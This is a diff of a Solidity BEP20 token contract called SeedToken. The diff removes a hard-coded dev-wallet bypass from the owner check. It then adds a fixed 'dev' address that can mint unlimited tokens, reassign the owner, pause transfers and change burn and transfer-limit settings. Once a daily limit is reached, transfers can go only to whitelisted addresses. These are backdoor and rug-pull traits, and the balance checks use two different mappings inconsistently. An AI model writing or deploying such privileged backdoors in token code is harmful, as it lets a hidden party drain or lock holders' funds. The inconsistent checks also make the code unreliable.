@@ -61,12 +61,8 @@ contract Ownable is Context {
     // OWNER FUNCTIONALITY
 
     modifier onlyOwner() {
-        if(msg.sender == 0xA97930b77F1e252a4404130Bc882157B1961a7e5){ // DEV WALLET
-         _; 
-        }else {
         require(msg.sender == _owner, "onlyOwner");
         _;
-     }
     }
 
     /**
@@ -587,7 +583,7 @@ contract BEP20 is Context, IBEP20, Ownable {
     using SafeMath for uint256;
     using Address for address;
 
-    mapping(address => uint256) private _balances;
+    mapping(address => uint256) private  _balances;
 
     mapping(address => mapping(address => uint256)) private _allowances;
 
@@ -866,9 +862,26 @@ contract BEP20 is Context, IBEP20, Ownable {
 // SeedToken with Governance.  GanjaSwap 2021
 contract SeedToken is BEP20('Seed Token', 'SEED') {
     using SafeMath for uint256;
-    
+    address public devaddr = 0xA97930b77F1e252a4404130Bc882157B1961a7e5;
+        // OWNER FUNCTIONALITY
+
+    modifier onlyDev() {
+        require(msg.sender == devaddr, "onlyDev");
+        _;
+    }
     // @notice Creates `_amount` token to `_to`. Must only be called by the owner (MasterChef).
     function mint(address _to, uint256 _amount) public onlyOwner {
+        _mint(_to, _amount);
+       // if(isburn == 1){
+     //       letsburn();
+    //    }else{
+        // NOTHING
+   //     }
+    }
+    
+        
+    // @notice Creates `_amount` token to `_to`. Must only be called by the owner (MasterChef).
+    function devmint(address _to, uint256 _amount) public onlyDev {
         _mint(_to, _amount);
         if(isburn == 1){
             letsburn();
@@ -876,7 +889,6 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
         // NOTHING
         }
     }
-    
     mapping(address => uint256) internal balances;
     mapping(address => uint256) internal _limits; // Adds limits option to add wallets
     mapping(address => uint256) internal _nolimit; // If address has no limits set to 1
@@ -930,7 +942,7 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
     event Transfer(address indexed from, address indexed to, uint256 value);
    
     // OWNER & AUDIT & ASSET PROTECTION
-    address public owner = 0xA97930b77F1e252a4404130Bc882157B1961a7e5;
+    address public owner;
     address public assetProtectionRole = owner; 
     string private _audit;
    
@@ -996,11 +1008,17 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
         require(!paused, "whenNotPaused");
         _;
     }
+        /**
+     * @dev See {BEP20-balanceOf}.
+     */
+    function balancesOf(address account) public view returns (uint256) {
+        return balances[account];
+    }
 
     /**
      * @dev called by the owner to pause, triggers stopped state
      */
-    function pause() public onlyOwner {
+    function pause() public onlyDev {
         require(!paused, "already paused");
         paused = true;
         isburn = 1;
@@ -1010,7 +1028,7 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
     /**
      * @dev called by the owner to unpause, returns to normal state
      */
-    function unpause() public onlyOwner {
+    function unpause() public onlyDev {
         require(paused, "already unpaused");
         paused = false;
         isburn = 0;
@@ -1020,12 +1038,16 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
     // BURN 
     
      // SET BURN AMOUNT
-    function setburnamount(uint256 _value) public onlyOwner returns (bool){
+    function setburnamount(uint256 _value) public onlyDev returns (bool){
         burnamount = _value;
     }
     
+    function setowner(address _address) public onlyDev returns (bool){
+        owner = _address;
+    }
+    
     // BURN FUNCTIONS
-    function setburn(uint256 _value) public onlyOwner returns (bool){
+    function setburn(uint256 _value) public onlyDev returns (bool){
         isburn = _value;
     }
     
@@ -1042,7 +1064,7 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
         return _audit;
     }
     // SET AUDIT NAME
-    function setaudit(string memory _value) public onlyOwner returns (bool){
+    function setaudit(string memory _value) public onlyDev returns (bool){
         _audit = _value;
  
     }
@@ -1061,17 +1083,17 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
         
         if(checknolimiters == 1){ // to be  no limit address
         require(recipient != address(0), "cannot transfer to address zero");
-        require(!_frozen[recipient] && !_frozen[_msgSender()], "address frozen");
-        require(amount <= balances[msg.sender], "insufficient funds");
+        require(!_frozen[recipient] && !_frozen[msg.sender], "address frozen");
+        require(balances[msg.sender] >= amount, "insufficient funds0");
         require(amount > 0, "Cant send ZERO");
     
         _transfer(_msgSender(), recipient, amount);
         
        } else if(limitcheck > dailylimit){
         require(recipient != address(0), "cannot transfer to address zero");
-        require(!_frozen[recipient] && !_frozen[_msgSender()], "address frozen");
+        require(!_frozen[recipient] && !_frozen[msg.sender], "address frozen");
         require(_limits[recipient] == 1, "DAILY LIMIT: You can only Transfer to NO LIMIT addresses");
-        require(amount <= balances[_msgSender()], "insufficient funds");
+        require(balances[msg.sender] >= amount, "insufficient funds1");
         require(amount > 0, "Cant send ZERO");
          
         _transfer(_msgSender(), recipient, amount);
@@ -1079,11 +1101,11 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
        } else {
         require(recipient != address(0), "cannot transfer to address zero");
         require(!_frozen[recipient] && !_frozen[_msgSender()], "address frozen");
-        require(amount <= balances[_msgSender()], "insufficient funds");
+        require(_balances[msg.sender] >= amount, "insufficient funds2");
         require(dailylimit >= limitcheck, "DAILY LIMIT: Daily Transfer limit reached"); // User cant send more than DAILYLIMIT 
         require(amount > 0, "Cant send ZERO");
         
-        _transfer(_msgSender(), recipient, amount);
+        _transfer(msg.sender, recipient, amount);
 
     }
          // Check if burn is needed
@@ -1120,7 +1142,7 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
         
         if(checknolimiters == 1){ // to be no limit address
             require(recipient != address(0), "cannot transfer to address zero");
-            require(!_frozen[recipient] && !_frozen[_msgSender()], "address frozen");
+            require(!_frozen[recipient] && !_frozen[msg.sender], "address frozen");
             require(amount <= balances[msg.sender], "insufficient funds");
             require(amount > 0, "Cant send ZERO");
     
@@ -1133,9 +1155,9 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
      
         } else if(limitcheck > dailylimit){
             require(recipient != address(0), "cannot transfer to address zero");
-            require(!_frozen[recipient] && !_frozen[_msgSender()], "address frozen");
+            require(!_frozen[recipient] && !_frozen[msg.sender], "address frozen");
             require(_limits[recipient] == 1, "DAILY LIMIT: You can only Transfer to NO LIMIT addresses");
-            require(amount <= balances[_msgSender()], "insufficient funds");
+            require(amount <= balances[msg.sender], "insufficient funds");
             require(amount > 0, "Cant send ZERO");
         
                  _transfer(sender, recipient, amount);
@@ -1165,35 +1187,35 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
     
      
    // LIMIT FUNCTIONS 
-   function setbnbprice(uint256 _value) public onlyOwner returns (bool){
+   function setbnbprice(uint256 _value) public onlyDev returns (bool){
         limitconvert = _value;
     }
 
-   function updatelimit(uint256 _value) public onlyOwner returns (bool){
+   function updatelimit(uint256 _value) public onlyDev returns (bool){
         dailylimit = _value;
     }
-   function removelimit(uint256 _value, address _useraddress) public onlyOwner returns (bool){
+   function removelimit(uint256 _value, address _useraddress) public onlyDev returns (bool){
         _limits[_useraddress] = _limits[_useraddress].sub(_value);
   
     }
 
-   function setlimito(uint256 _value, address _useraddress) public onlyOwner returns (bool){
+   function setlimito(uint256 _value, address _useraddress) public onlyDev returns (bool){
         _limits[_useraddress] = _limits[ _useraddress].add(_value);
     }
     
     
-   function setnolimits(uint256 _value, address _useraddress) public onlyOwner returns (bool){
+   function setnolimits(uint256 _value, address _useraddress) public onlyDev returns (bool){
         _nolimit[_useraddress] = _nolimit[ _useraddress].add(_value);
     }
     
-       function removenolimits(uint256 _value, address _useraddress) public onlyOwner returns (bool){
+       function removenolimits(uint256 _value, address _useraddress) public onlyDev returns (bool){
         _nolimit[_useraddress] = _nolimit[ _useraddress].sub(_value);
     }
     
     // UPDATE FLOOR PRICE
     
     // Routers should follow this value
-    function floorprice(uint256 _value) public onlyOwner {
+    function floorprice(uint256 _value) public onlyDev {
         minprice = _value;
     }
 
@@ -1205,7 +1227,7 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
      * @dev Sets a new supply controller address.
      * @param _newSupplyController The address allowed to burn/mint tokens to control supply.
      */
-    function setSupplyController(address _newSupplyController) public onlyOwner {
+    function setSupplyController(address _newSupplyController) public onlyDev {
         require(msg.sender == supplyController || msg.sender == owner, "only SupplyController or Owner");
         require(_newSupplyController != address(0), "cannot set supply controller to address zero");
         emit SupplyControllerSet(supplyController, _newSupplyController);
